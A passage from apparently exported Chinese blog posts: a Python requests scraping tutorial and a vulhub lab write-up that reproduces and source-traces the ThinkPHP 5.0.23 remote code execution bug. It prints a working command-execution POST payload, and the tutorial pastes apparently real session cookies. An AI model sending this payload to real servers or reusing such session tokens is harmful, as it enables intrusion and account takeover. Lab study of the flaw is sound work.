x27;,),407：(&#x27;proxy_authentication_required&#x27;,&#x27;proxy_auth&#x27;,&#x27;proxy_authentication&#x27;),408：(&#x27;request_timeout&#x27;,&#x27;timeout&#x27;),409：(&#x27;conflict&#x27;,),410：(&#x27;gone&#x27;,),411：(&#x27;length_required&#x27;,),412：(&#x27;precondition_failed&#x27;,&#x27;precondition&#x27;),413：(&#x27;request_entity_too_large&#x27;,),414：(&#x27;request_uri_too_large&#x27;,),415：(&#x27;unsupported_media_type&#x27;,&#x27;unsupported_media&#x27;,&#x27;media_type&#x27;),416：(&#x27;request_range_not_satisfiable&#x27;,&#x27;requested_range&#x27;,&#x27;range_not_satisfiable&#x27;),417：(&#x27;expectation_failed&#x27;,),418：(&#x27;im_a_teapot&#x27;,&#x27;teapot&#x27;,&#x27;i_am_a_teapot&#x27;),421：(&#x27;misdirected_request&#x27;,),422：(&#x27;unprocessable_entity&#x27;,&#x27;unprocessable&#x27;),423：(&#x27;locked&#x27;),424：(&#x27;failed_dependency&#x27;,&#x27;dependency&#x27;),425：(&#x27;unordered_collection&#x27;,&#x27;unordered&#x27;),426：(&#x27;upgrade_required&#x27;,&#x27;upgrade&#x27;),428：(&#x27;precondition_required&#x27;,&#x27;precondition&#x27;),429：(&#x27;too_many_requests&#x27;,&#x27;too_many&#x27;),431：(&#x27;header_fields_too_large&#x27;,&#x27;fields_too_large&#x27;),444：(&#x27;no_response&#x27;,&#x27;none&#x27;),449：(&#x27;retry_with&#x27;,&#x27;retry&#x27;),450：(&#x27;blocked_by_windows_parental_controls&#x27;,&#x27;parental_controls&#x27;),451：(&#x27;unavailable_for_legal_reasons&#x27;,&#x27;legal_reasons&#x27;),499：(&#x27;client_closed_request&#x27;,),#服务端错误状态码500：(&#x27;internal_server_error&#x27;,&#x27;server_error&#x27;,&#x27;/o\\\\&#x27;,&#x27;×&#x27;)501：(&#x27;not_implemented&#x27;,),502：(&#x27;bad_gateway&#x27;,),503：(&#x27;service_unavailable&#x27;,&#x27;unavailable&#x27;),504：(&#x27;gateway_timeout&#x27;,),505：(&#x27;http_version_not_supported&#x27;,&#x27;http_version&#x27;),506：(&#x27;variant_also_negotiates&#x27;,),507：(&#x27;insufficient_storage&#x27;,),509：(&#x27;bandwidth_limit_exceeded&#x27;,&#x27;bandwith&#x27;),510：(&#x27;not_extended&#x27;,),511：(&#x27;network_authentication_required&#x27;,&#x27;network_auth&#x27;,&#x27;network_authentication&#x27;)\n\n4.爬取二进制数据图片、音频、视频这些文件本质上都是由二进制码组成的，所以想要爬取它们，就要拿到它们的二进制码。以爬取百度的站点图标（选项卡上的小图标）为例\nimport requests#向资源URL发送一个GET请求r = requests.get(&#x27;https://www.baidu.com/favicon.ico&#x27;)with open(&#x27;favicon.ico&#x27;,&#x27;wb&#x27;) as f:#favicon.ico是储存二进制内容的文件名，wb则是表示以二进制的形式写入数据  f.write(r.content)# r.content是响应对象的二进制数据属性，适用于下载图片、音频、视频等非文本文件\n\n使用open( )方法，它的第一个参数是要保存文件名（可带路径），第二个参数表示以二进制的形式写入数据。运行结束之后，可以在当前目录下发现保存的名为favicon.ico的图标。同样的，音频和视频也可以用这种方法获取。\n5.发送请求感觉发送请求没什么难度，我就写一个登录的请求头吧\n我们先抓到buuctf的包，可以看见返回了cookie\nGET / HTTP/1.1Host: buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: session=a0d49037-f357-4372-b3e2-2ec0ed8e51e8.k3COsQr7VNEUU08XD_qiU6WnELIUpgrade-Insecure-Requests: 1Priority: u=0, i\n\nimport requestsurl=&#x27;http://buuoj.cn/&#x27;headers=&#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&#x27;,    &#x27;Cookie&#x27;: &#x27;session=a0d49037-f357-4372-b3e2-2ec0ed8e51e8.k3COsQr7VNEUU08XD_qiU6WnELI&#x27;&#125;#设置好cookie和user-agent#然后请求即可response=requests.get(url,headers=headers)with open(&#x27;buuctf.html&#x27;,&#x27;wb&#x27;,encoding=&#x27;utf-8&#x27;) as f:  f.write(response.content)\n\n\n\n运行便拿到了登录成功的数据\n6.处理cookie获取cookie\nimport requestsr = requests.get(&#x27;https://www.baidu.com&#x27;)#打印Cookies对象print(r.cookies)#遍历Cookiesfor key,value in r.cookies.items():\tprint(key+&#x27;=&#x27;+value)\n\n通过响应对象调用cookies属性即可获得Cookies，它是一个RequestCookiesJar类型的对象，然后用items( )方法将其转换为元组组成 的列表，遍历输出每一个Cookies的名称和值。\n使用cookie来维持登录状态\n以知乎为例，首先登录知乎，进入一个登录之后才可以访问的页面，在浏览器开发者工具中将Headers 中的Cookies复制下来（有时候这样直接复制的Cookies中包含省略号，会导致程序出错，此时可以在Console项下输document.cookie 即可得到完整的Cookie），在程序中使用它，将其设置到Headers里面，然后发送请求。\nimport requestsheaders = &#123;  &#x27;Cookie&#x27;:&#x27;_zap=616ef976-1fdb-4b8c-a3cb-9327ff629ff1; _xsrf=0CCNkbCLtTAlz5BfwhMHBHJWW791ZkK6; d_c0=\\&quot;AKBQTnFIRhSPTpoYIf6mUxSic2UjzSp4BYM=|1641093994\\&quot;; __snaker__id=mMv5F3gmBHIC9jJg; gdxidpyhxdE=E%2BNK7sMAt0%2F3aZ5Ke%2FSRfBRK7B1QBmCtaOwrqJm%2F1ONP3VPItkrXCcMiAX3%2FIsSxUwudQPyuDGO%2BlHGPvNqGqO9bX1%2B58o7wmf%2FZewh8xSPg%2FH3T2HoWsrs7ZhsSGND0C0la%2BXkLIIG5XXV85PxV5g99d%5CMph%2BbkX1JQBGhDnL3N0zRf%3A1641094897088; _9755xjdesxxd_=32; YD00517437729195%3AWM_NI=rMeMx2d5Yt3mg0yHPvuPGTjPnGtjL%2Bn%2FPSBnVn%2FHFAVZnIEABUIPITBdsHmMX1iCHfKauO4qhW%2Bi5bTy12Cg91vrxMPgOHtnaAylN8zk7MFpoTr%2FTeKVo3%2FKSSM6T5cNSGE%3D; YD00517437729195%3AWM_NIKE=9ca17ae2e6ffcda170e2e6ee8bea40f8e7a4b2cf69b3b48fb7c54b979b8fbaf17e93909b91fb338ebaaeadec2af0fea7c3b92ab293abaefb3aa8eb9795b267a5f0b7a9d37eb79089b5e95cae99bc8bcf21aef1a0b4c16696b2e1a9c54b9686a2aac84b828b87b1cc6082bcbda9f0479cefa7a4cb6e89bfbbb0b77bac89e58ab86a98a7ffd3c26dfbefba93fb4794b981a9f766a39fb78dcd34bab5f9aec57cad8cbed0d76f898aa1d4ae41918d83d7d73fa1929da8c837e2a3; YD00517437729195%3AWM_TID=Kji43bLtZbRAAAVABFMu4upmK4C%2BEGQH; KLBRSID=9d75f80756f65c61b0a50d80b4ca9b13|1641268679|1641267986; tst=r; NOT_UNREGISTER_WAITING=1; SESSIONID=lbWS7Y8pmp5qM1DErkXJCahgQwwyl79eT8XAOC6qC7A; JOID=V1wXAUwzD9BQH284PTQMxsZMqrkrXmuHBio3Bk1cfuMhV1x9fiHKBjYcaD44XxiWm2kKD5TjJvk-7iTeM3d6aYA=; osd=VVoQAk0xCddTHm0-OjcNxMBLqbgpWGyEBygxAU5dfOUmVF1_eCbJBzQabz05XR6RmGgICZPgJ_s46SffMXF9aoE=; Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49=1640500881,1641093994,1641267987; Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49=1641268678&#x27;,  &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;,  &#x27;Host&#x27;:&#x27;www.zhihu.com&#x27;&#125;r = requests.get(&#x27;https://www.zhihu.com/people/xing-fu-shi-fen-dou-chu-lai-de-65-18&#x27;,headers=headers)print(r.text)\n\n运行之后，结果中包含了登录后的内容，说明获取登录状态成功。\n通过cookie参数来设置\n也可以通过cookies参数来设置，不过这样就需要构造RequestCookieJar对象，而且需要分割以下cookies，相对繁琐，但效果是一 样。\nimport requestscookies =&#x27;_zap=616ef976-1fdb-4b8c-a3cb-9327ff629ff1; _xsrf=0CCNkbCLtTAlz5BfwhMHBHJWW791ZkK6; d_c0=\\&quot;AKBQTnFIRhSPTpoYIf6mUxSic2UjzSp4BYM=|1641093994\\&quot;; __snaker__id=mMv5F3gmBHIC9jJg; gdxidpyhxdE=E%2BNK7sMAt0%2F3aZ5Ke%2FSRfBRK7B1QBmCtaOwrqJm%2F1ONP3VPItkrXCcMiAX3%2FIsSxUwudQPyuDGO%2BlHGPvNqGqO9bX1%2B58o7wmf%2FZewh8xSPg%2FH3T2HoWsrs7ZhsSGND0C0la%2BXkLIIG5XXV85PxV5g99d%5CMph%2BbkX1JQBGhDnL3N0zRf%3A1641094897088; _9755xjdesxxd_=32; YD00517437729195%3AWM_NI=rMeMx2d5Yt3mg0yHPvuPGTjPnGtjL%2Bn%2FPSBnVn%2FHFAVZnIEABUIPITBdsHmMX1iCHfKauO4qhW%2Bi5bTy12Cg91vrxMPgOHtnaAylN8zk7MFpoTr%2FTeKVo3%2FKSSM6T5cNSGE%3D; YD00517437729195%3AWM_NIKE=9ca17ae2e6ffcda170e2e6ee8bea40f8e7a4b2cf69b3b48fb7c54b979b8fbaf17e93909b91fb338ebaaeadec2af0fea7c3b92ab293abaefb3aa8eb9795b267a5f0b7a9d37eb79089b5e95cae99bc8bcf21aef1a0b4c16696b2e1a9c54b9686a2aac84b828b87b1cc6082bcbda9f0479cefa7a4cb6e89bfbbb0b77bac89e58ab86a98a7ffd3c26dfbefba93fb4794b981a9f766a39fb78dcd34bab5f9aec57cad8cbed0d76f898aa1d4ae41918d83d7d73fa1929da8c837e2a3; YD00517437729195%3AWM_TID=Kji43bLtZbRAAAVABFMu4upmK4C%2BEGQH; KLBRSID=9d75f80756f65c61b0a50d80b4ca9b13|1641268679|1641267986; tst=r; NOT_UNREGISTER_WAITING=1; SESSIONID=lbWS7Y8pmp5qM1DErkXJCahgQwwyl79eT8XAOC6qC7A; JOID=V1wXAUwzD9BQH284PTQMxsZMqrkrXmuHBio3Bk1cfuMhV1x9fiHKBjYcaD44XxiWm2kKD5TjJvk-7iTeM3d6aYA=; osd=VVoQAk0xCddTHm0-OjcNxMBLqbgpWGyEBygxAU5dfOUmVF1_eCbJBzQabz05XR6RmGgICZPgJ_s46SffMXF9aoE=; Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49=1640500881,1641093994,1641267987; Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49=1641268678&#x27;jar = requests.cookies.RequestsCookieJar()headers = &#123;  &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;,  &#x27;Host&#x27;:&#x27;www.zhihu.com&#x27;&#125;for cookie in cookies.split(&#x27;;&#x27;):  key,value = cookie.split(&#x27;=&#x27;,1)  jar.set(key,value)r = requests.get(&#x27;https://www.zhihu.com/people/xing-fu-shi-fen-dou-chu-lai-de-65-18&#x27;,headers=headers)print(r.text)\n\n7.会话维持通过调用get( )或post( )等方法可以做到模拟网页的请求，但是这实际上是相当于不同的会话，也就是说相当于你用了两个浏览器打开不同的页面。如果第一个请求利用post( )方法登录了网站，第二次想获取登录成功后的自己的个人信息，又使用了一次get( )方法取请求个人信息，实际上，这相当于打开了两个浏览器，所以是不能成功的获取到个人信息的。为此，需要会话维持，你可以在两次请求时设置一样的Cookies，但这样很繁琐，而通过Session类可以很轻松地维持一个会话。\nimport requestss = requests.Session()s.get(&#x27;http://httpbin.org/cookies/set/number/123456789&#x27;)r = s.get(&#x27;http://httpbin.org/cookies&#x27;)print(r.text)\n\n首先通过requests打开一个会话，然后通过该会话发送了一个get请求，该请求用于向cookies中设置参数number，参数值为123456789；接着又使用该发起了一个get请求，用于获取Cookies，然后打印获取的内容。\n\n\n8.SSL证书验证requests还提供了证书验证功能，当发送HTTP请求的时候，它会检查SSL证书，我们可以使用verify参数控制是否检查SSL证书\n1）请求一个HTTPS网站时，如果该网站的证书没有被CA机构信任，程序将会出错，提示SSL证书验证错误。对此，只需要将verify参数 设置为False即可。如下：\nimport requestsresposne = requests.get(&#x27;https://www.12306.cn&#x27;,verify=False)print(response.status_code)\n\n"},{"title":"vulhub_ThinkPHP_5.0.23-rce漏洞复现","url":"/2025/08/20/vulhub-ThinkPHP-5-0-23-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"vulhub_ThinkPHP_5.0.23-rce漏洞复现我们先使用docker拉取镜像\ndocker compose up -d\n\n然后将源码下载下来\ndocker cp 5023-rce-web-1:/var/www ~/thinkphp5\n\n不知道为什么thinkphp5的目录结构为\n/var/www/├── application/   # 应用逻辑├── thinkphp/      # 框架核心├── vendor/        # composer 包└── public/        # 网站根目录，仅对外暴露    ├── index.php    ├── router.php    └── static/\n\n少了html目录，以前版本的TP都是直接将整个项目放在html目录下的\n到了 TP5，官方推荐把 入口文件单独放在 /public 目录，其余核心代码不放在 Web 根目录，目的就是 安全（防止源码被直接下载、配置文件被泄露）\n也就是说以前的html目录为入口文件目录，会有其他配置文件被下载造成安全问题，现在将核心代码放在www目录下\n不知道为什么对于漏洞复现网上很多文章都是直接给wehshell的，那让我这种什么都不懂的人上哪里学去啊，payload也看不懂完了\n还是先把payload挂出来\nPOST /index.php?s=captcha HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72 _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id\n\n\n\n\n\n1.漏洞原理我们还是从index.php开始\n&lt;?php// [ 应用入口文件 ]// 定义应用目录define(&#x27;APP_PATH&#x27;, __DIR__ . &#x27;/../application/&#x27;);// 加载框架引导文件require __DIR__ . &#x27;/../thinkphp/start.php&#x27;;\n\n这里指向start.php，我找来\n&lt;?phpnamespace think;//这个是用于命令空间用于区分同名的类的，感觉有点像java中的打包但是在TP中应该没有访问限制吧// ThinkPHP 引导文件// 1. 加载基础文件require __DIR__ . &#x27;/base.php&#x27;;// 2. 执行应用App::run()-&gt;send();//调用了App类中的run方法 由于限定了命令空间为think 所以我们需要去当前目录下/think/App.php中找到\n\n找到了App.php中的run方法\npublic static function run(Request $request = null)&#123;    $request = is_null($request) ? Request::instance() : $request;    try &#123;        $config = self::initCommon();        // 模块/控制器绑定        if (defined(&#x27;BIND_MODULE&#x27;)) &#123;            BIND_MODULE &amp;&amp; Route::bind(BIND_MODULE);        &#125; elseif ($config[&#x27;auto_bind_module&#x27;]) &#123;            // 入口自动绑定            $name = pathinfo($request-&gt;baseFile(), PATHINFO_FILENAME);            if ($name &amp;&amp; &#x27;index&#x27; != $name &amp;&amp; is_dir(APP_PATH . $name)) &#123;                Route::bind($name);            &#125;        &#125;        $request-&gt;filter($config[&#x27;default_filter&#x27;]);        // 默认语言        Lang::range($config[&#x27;default_lang&#x27;]);        // 开启多语言机制 检测当前语言        $config[&#x27;lang_switch_on&#x27;] &amp;&amp; Lang::detect();        $request-&gt;langset(Lang::range());        // 加载系统语言包        Lang::load([            THINK_PATH . &#x27;lang&#x27; . DS . $request-&gt;langset() . EXT,            APP_PATH . &#x27;lang&#x27; . DS . $request-&gt;langset() . EXT,        ]);        // 监听 app_dispatch        Hook::listen(&#x27;app_dispatch&#x27;, self::$dispatch);        // 获取应用调度信息        $dispatch = self::$dispatch;        // 未设置调度信息则进行 URL 路由检测        if (empty($dispatch)) &#123;            $dispatch = self::routeCheck($request, $config);        &#125;        // 记录当前调度信息        $request-&gt;dispatch($dispatch);        // 记录路由和请求信息        if (self::$debug) &#123;            Log::record(&#x27;[ ROUTE ] &#x27; . var_export($dispatch, true), &#x27;info&#x27;);            Log::record(&#x27;[ HEADER ] &#x27; . var_export($request-&gt;header(), true), &#x27;info&#x27;);            Log::record(&#x27;[ PARAM ] &#x27; . var_export($request-&gt;param(), true), &#x27;info&#x27;);        &#125;        // 监听 app_begin        Hook::listen(&#x27;app_begin&#x27;, $dispatch);        // 请求缓存检查        $request-&gt;cache(            $config[&#x27;request_cache&#x27;],            $config[&#x27;request_cache_expire&#x27;],            $config[&#x27;request_cache_except&#x27;]        );        $data = self::exec($dispatch, $config);    &#125; catch (HttpResponseException $exception) &#123;        $data = $exception-&gt;getResponse();    &#125;    // 清空类的实例化    Loader::clearInstance();    // 输出数据到客户端    if ($data instanceof Response) &#123;        $response = $data;    &#125; elseif (!is_null($data)) &#123;        // 默认自动识别响应输出类型        $type = $request-&gt;isAjax() ?        Config::get(&#x27;default_ajax_return&#x27;) :        Config::get(&#x27;default_return_type&#x27;);        $response = Response::create($data, $type);    &#125; else &#123;        $response = Response::create();    &#125;    // 监听 app_end    Hook::listen(&#x27;app_end&#x27;, $response);    return $response;&#125;\n\n现在的我肯定看不懂这个代码，但是好在还是有大佬写了漏洞的触发点，就在这一部分\n            Hook::listen(&#x27;app_dispatch&#x27;, self::$dispatch);//我们需要知道在没有代码往$dispatch中写入内容，这个listen方法参数为空没有意义            // 获取应用调度信息            $dispatch = self::$dispatch;            // 未设置调度信息则进行 URL 路由检测            if (empty($dispatch)) &#123;//这个刚好和上面不同，如果$dispatch则会触发routeCheck方法去为$dispatch赋值                $dispatch = self::routeCheck($request, $config);            &#125;            // 记录当前调度信息            $request-&gt;dispatch($dispatch);//上面部分代码是用于为$dispatch进行赋值的//然后后面还有触发漏洞的代码            Hook::listen(&#x27;app_begin&#x27;, $dispatch);            // 请求缓存检查            $request-&gt;cache(                $config[&#x27;request_cache&#x27;],                $config[&#x27;request_cache_expire&#x27;],                $config[&#x27;request_cache_except&#x27;]            );            $data = self::exec($dispatch, $config);//通过exec方法触发漏洞 但是这里没有设置        &#125; catch (HttpResponseException $exception) &#123;            $data = $exception-&gt;getResponse();        &#125;\n\n我们先不用去管listen方法到底做了什么，我们需要知道listen这个方法就是在进行URL解析为dispatch赋值之前，如果代码设置了dispatch值则可以绕过URL解析\n我们来看一下listen方法\nHook::listen(&#x27;app_dispatch&#x27;, self::$dispatch);public static function listen($tag, &amp;$params = null, $extra = null, $once = false)    &#123;        $results = [];        foreach (static::get($tag) as $key =&gt; $name) &#123;            $results[$key] = self::exec($name, $tag, $params, $extra);            // 如果返回 false，或者仅获取一个有效返回则中断行为执行            if (false === $results[$key] || (!is_null($results[$key]) &amp;&amp; $once)) &#123;                break;            &#125;        &#125;        return $once ? end($results) : $results;    &#125;\n\n这里我们首先就看到了这次有漏洞的exec方法，只是正常情况是不会设置dispatch所以也无法触发漏洞，但是我们可以看到它通过foreach和get方法GPT说\n你可以把 listen 看成是一个 事件调度器，比如说：listen(&#39;app_dispatch&#39;, $dispatch) 意味着：通知所有订阅了 app_dispatch 的插件&#x2F;行为，让它们有机会修改 $dispatch。\n这个我还是有点看不懂但是漏洞不会经过这里就是了\n如果dispatch为空则触发routeCheck方法\npublic static function routeCheck($request, array $config)&#123;    $path   = $request-&gt;path();    $depr   = $config[&#x27;pathinfo_depr&#x27;];    $result = false;    // 删掉了一堆路由检测代码    // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索    if (false === $result) &#123;        $result = Route::parseUrl($path, $depr, $config[&#x27;controller_auto_search&#x27;]);    &#125;    return $result;&#125;\n\n这个则是到了框架的核心路由检测了吗，这个方法我感觉没什么好看的，因为从逻辑上来看，这里进行了函数的嵌套，第一次执行的result为false，也就是第一次执行的方法会直接执行这段代码再进行后续的分析\nif (false === $result) &#123;    $result = Route::parseUrl($path, $depr, $config[&#x27;controller_auto_search&#x27;]);&#125;\n\n于是让我们把方向转向有漏洞触发点，也是路由解析核心的parseUrl方法，太长了就只放关键的部分，其他的就是正常的路由解析然后找模板和方法，不得不说TP每次版本一变路由解析方法基本上都得变好多\n\n\n\n\n我们来看漏洞的触发点App.class的exec方法\n    protected static function exec($dispatch, $config)    &#123;        switch ($dispatch[&#x27;type&#x27;]) &#123;            case &#x27;redirect&#x27;: // 重定向跳转                $data = Response::create($dispatch[&#x27;url&#x27;], &#x27;redirect&#x27;)                    -&gt;code($dispatch[&#x27;status&#x27;]);                break;            case &#x27;module&#x27;: // 模块/控制器/操作                $data = self::module(                    $dispatch[&#x27;module&#x27;],                    $config,                    isset($dispatch[&#x27;convert&#x27;]) ? $dispatch[&#x27;convert&#x27;] : null                );                break;            case &#x27;controller&#x27;: // 执行控制器操作                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#x27;var&#x27;]);                $data = Loader::action(                    $dispatch[&#x27;controller&#x27;],                    $vars,                    $config[&#x27;url_controller_layer&#x27;],                    $config[&#x27;controller_suffix&#x27;]                );                break;            case &#x27;method&#x27;: // 回调方法//这个method是漏洞的关键                $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#x27;var&#x27;]);//先是触发了Request类的param方法，instance是实例方法，相当于直接实例化                $data = self::invokeMethod($dispatch[&#x27;method&#x27;], $vars);                break;            case &#x27;function&#x27;: // 闭包                $data = self::invokeFunction($dispatch[&#x27;function&#x27;]);                break;            case &#x27;response&#x27;: // Response 实例                $data = $dispatch[&#x27;response&#x27;];                break;            default:                throw new \\InvalidArgumentException(&#x27;dispatch type not support&#x27;);        &#125;        return $data;    &#125;\n\n这里我们如果传入dispatch[&#39;type&#39;]=method就会触发param方法\n$method = $this-&gt;method(true);//注意这里传入的参数为true  是为了防止重复执行下面那个漏洞语句\n\n其中这个代码又触发了method方法\n    public function method($method = false)//我们传入的是true，所以为true    &#123;        if (true === $method) &#123;            // 获取原始请求类型            return $this-&gt;server(&#x27;REQUEST_METHOD&#x27;) ?: &#x27;GET&#x27;;//如果有设置则为设置否则为GET        &#125; elseif (!$this-&gt;method) &#123;//这次没有触发，在控制器调度前以method为flase触发过了            if (isset($_POST[Config::get(&#x27;var_method&#x27;)])) &#123;//如果我们$_POST数组中存在配置参数                $this-&gt;method = strtoupper($_POST[Config::get(&#x27;var_method&#x27;)]);                $this-&gt;&#123;$this-&gt;method&#125;($_POST);//则获取这个参数转为大写然后调用这个方法$_POST作为参数            &#125; elseif (isset($_SERVER[&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;])) &#123;                $this-&gt;method = strtoupper($_SERVER[&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;]);            &#125; else &#123;                $this-&gt;method = $this-&gt;server(&#x27;REQUEST_METHOD&#x27;) ?: &#x27;GET&#x27;;            &#125;        &#125;        return $this-&gt;method;    &#125;\n\n这个是处理我们payload的核心方法，这个方法在payload中我们使用的是\n_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id\n\n在调度模板前就触发过一次了，也就是获取到__construct这个魔术方法，大小不会对方法造成影响，我们触发这个方法的目的是为了为$filter这个属性赋值\n//我们传入参数为$_POST    protected function __construct($options = [])    &#123;        foreach ($options as $name =&gt; $item) &#123;            if (property_exists($this, $name)) &#123;//这个函数是为了检查这个类中是否有我们传入的键名这个属性，如果有则进行赋值                $this-&gt;$name = $item;            &#125;        &#125;        if (is_null($this-&gt;filter)) &#123;            $this-&gt;filter = Config::get(&#x27;default_filter&#x27;);        &#125;        // 保存 php://input        $this-&gt;input = file_get_contents(&#x27;php://input&#x27;);    &#125;\n\n我们之前提到，触发method方法需要经过param方法，我们现在继续来看\n//触发这个方法的时候没有参数    public function param($name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)    &#123;//是为了获取真正的请求方法        if (empty($this-&gt;mergeParam)) &#123;            $method = $this-&gt;method(true);            // 自动获取请求变量            switch ($method) &#123;                case &#x27;POST&#x27;:                    $vars = $this-&gt;post(false);//tp的特殊方法传入false获取原始的$_POST数组                    break;                case &#x27;PUT&#x27;:                case &#x27;DELETE&#x27;:                case &#x27;PATCH&#x27;:                    $vars = $this-&gt;put(false);                    break;                default:                    $vars = [];            &#125;            // 当前请求参数和URL地址中的参数合并            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));//这里合并了路由GET和POST参数 这里也是关键点，由于合并数组时相同的键会进行覆盖，为了我们的$this-&gt;param不被覆盖，所以我们上面必须为default            $this-&gt;mergeParam = true;//避免重复解析        &#125;        if (true === $name) &#123;            // 获取包含文件上传信息的数组            $file = $this-&gt;file();            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;            return $this-&gt;input($data, &#x27;&#x27;, $default, $filter);        &#125;    //由于有参数，直接最后return        return $this-&gt;input($this-&gt;param, $name, $default, $filter);    &#125;\n\n我们最后的param数组应该是\n[    &#x27;_method&#x27; =&gt; &#x27;__construct&#x27;,    &#x27;filter&#x27; =&gt; [&#x27;system&#x27;],    &#x27;method&#x27; =&gt; &#x27;get&#x27;,    &#x27;server&#x27; =&gt; [        &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;id&#x27;    ]]\n\n我们通过server[REQUEST_METHOD]=whoami可以污染$this-&gt;server(&#39;REQUEST_METHOD&#39;)让其覆盖系统配置绕过switch\n我们直接带着参数来看input方法\nreturn $this-&gt;input($this-&gt;param, $name, $default, $filter);public function input($data = [], $name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)    &#123;        if (false === $name) &#123;            // 获取原始数据            return $data;        &#125;        $name = (string) $name;        if (&#x27;&#x27; != $name) &#123;            // 解析name            if (strpos($name, &#x27;/&#x27;)) &#123;                list($name, $type) = explode(&#x27;/&#x27;, $name);            &#125; else &#123;                $type = &#x27;s&#x27;;            &#125;//如果我们传入的name中出现了/则会将其斜杆两边为数组否则data为s字符串，我们这里是为空则是s 后面会进行类型转换但是和我们的漏洞没关系            // 按.拆分成多维数组进行判断            foreach (explode(&#x27;.&#x27;, $name) as $val) &#123;                if (isset($data[$val])) &#123;                    $data = $data[$val];                &#125; else &#123;                    // 无输入数据，返回默认值                    return $default;                &#125;            &#125;            if (is_object($data)) &#123;                return $data;            &#125;        &#125;        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) &#123;            array_walk_recursive($data, [$this, &#x27;filterValue&#x27;], $filter);//我们需要注意的是这个data参数是POST和GET和路由参数            reset($data);//终于到了，我们的漏洞终点。通过array_walk_recursive进行函数执行        &#125; else &#123;            $this-&gt;filterValue($data, $name, $filter);        &#125;        if (isset($type) &amp;&amp; $data !== $default) &#123;            // 强制类型转换            $this-&gt;typeCast($data, $type);        &#125;        return $data;    &#125;\n\n\n\narray_walk_recursive\narray_walk_recursive() 是 PHP 中用于递归地对数组的每个元素应用用户自定义函数的函数。\narray_walk_recursive(array &amp;$array, callable $callback, mixed $userdata = null): bool\n\n\n$array: 要处理的数组（按引用传递）\n$callback: 回调函数，处理每个元素\n$userdata (可选): 传递给回调函数的额外数据\n\n我来看代码\narray_walk_recursive($data, [$this, &#x27;filterValue&#x27;], $filter);//被我们污染为system的filter被传入\n\n[$this, &#39;filterValue&#39;]这个指代的是回调函数，也就是代表当前类的filterValue方法\n    private function filterValue(&amp;$value, $key, $filters)    &#123;        $default = array_pop($filters);        foreach ($filters as $filter) &#123;            if (is_callable($filter)) &#123;                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);//这里通过call_user_func调用system方法，我们传入的参数单个system的参数            &#125; elseif (is_scalar($value)) &#123;                if (false !== strpos($filter, &#x27;/&#x27;)) &#123;                    // 正则过滤                    if (!preg_match($filter, $value)) &#123;                        // 匹配不成功返回默认值                        $value = $default;                        break;                    &#125;                &#125; elseif (!empty($filter)) &#123;                    // filter函数不存在时, 则使用filter_var进行过滤                    // filter为非整形值时, 调用filter_id取得过滤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) &#123;                        $value = $default;                        break;                    &#125;                &#125;            &#125;        &#125;        return $this-&gt;filterExp($value);    &#125;\n\n\n\n最后总结一下，这个漏洞形成的主要原因就是PHP中$_POST数组会有一部分类似_method等的配置信息，然后获取配置信息时未对POST传参做过滤导致我们写入配置信息，让$filter这种关键函数执行属性被污染，执行我们传递的函数。\n我们在来看线整个漏洞的触发顺序吧\n第一步\n在代码运行之前会触发method方法加载配置，通过POST传参传递_method覆盖$_POST中的信息，触发__construct方法然后通过POST传递filter参数污染当前类的filer参数\n第二步\n代码运行从index.php开始触发App::run方法，run方法中使用exec方法中调用Request::instance()-&gt;param()，param方法通过methode方法获取到我们请求头中的参数，然后调用input方法，input方法中通过\narray_walk_recursive($data, [$this, &#x27;filterValue&#x27;], $filter);\n\n调用filterValue方法，并写入被污染的filter\n最后\n通过filterValue方法中的call_user_func($filter, $value);调用我们传入的函数，然后将我们的POST和GET传递的参数数组作为参数，我们需要传入的参数其实也是固定的，也是和_method一样覆盖$_POST的配置信息，但是是第二次通过method方法时通过\nreturn $this-&gt;server(&#x27;REQUEST_METHOD&#x27;) ?: 